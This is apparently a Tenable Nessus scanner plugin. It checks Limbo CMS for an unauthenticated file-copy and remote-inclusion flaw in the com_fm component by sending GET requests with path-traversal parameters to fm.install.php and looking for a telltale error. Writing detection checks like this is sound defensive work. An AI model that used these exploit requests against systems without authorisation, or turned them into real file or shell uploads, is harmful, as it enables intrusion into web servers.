#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22408);
  script_version("$Revision: 1.12 $");
  script_osvdb_id(28976);

  script_name(english:"Limbo com_fm Component sql.php classes_dir Parameter Remote File Inclusion");
  script_summary(english:"Tries to call Limbo's com_fm installer");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains PHP scripts that allow copying of
arbitrary files into the web document directory." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Limbo CMS, a content-management system
written in PHP. 

The 'com_fm' component of the version of Limbo installed on the remote
host allows an unauthenticated, remote attacker to copy arbitrary
files, possibly taken from a third-party host, into the web document
directory.  An unauthenticated attacker may be able to exploit this
flaw to read files on the affected host or even set up a PHP shell
that would allow execution of arbitrary code, subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/446142/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/09/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/09/13");
 script_cvs_date("$Date: 2013/01/25 01:19:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/limbo", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Our exploits won't actually replace the 'fm.english.php' script; instead,
  # we just hope to see an error. This could lead to a false-positive if the
  # web user id can't actually write to 'fm.english.php'.
  bogus_dir = string(SCRIPT_NAME, "-", unixtime());
  if (thorough_tests) exploits = make_list(
    string(
      dir, "/admin/components/com_fm/fm.install.php?",
      "lm_absolute_path=../../../&",
      "install_dir=", bogus_dir
    ),
    string(
      dir, "/components/com_fm/fm.install.php?",
      "lm_absolute_path=../../&",
      "install_dir=", bogus_dir
    )
  );
  else exploits = make_list(
    string(
      dir, "/admin/components/com_fm/fm.install.php?",
      "lm_absolute_path=../../../&",
      "install_dir=", bogus_dir
    )
  );

  foreach exploit (exploits)
  {
    w = http_send_recv3(method:"GET", item:exploit, port:port);
    if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
    res = w[2];

    # There's a problem if we see an error with our bogus directory name.
    if (string("copy(", bogus_dir, "/fm.english.php): failed to open stream") >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
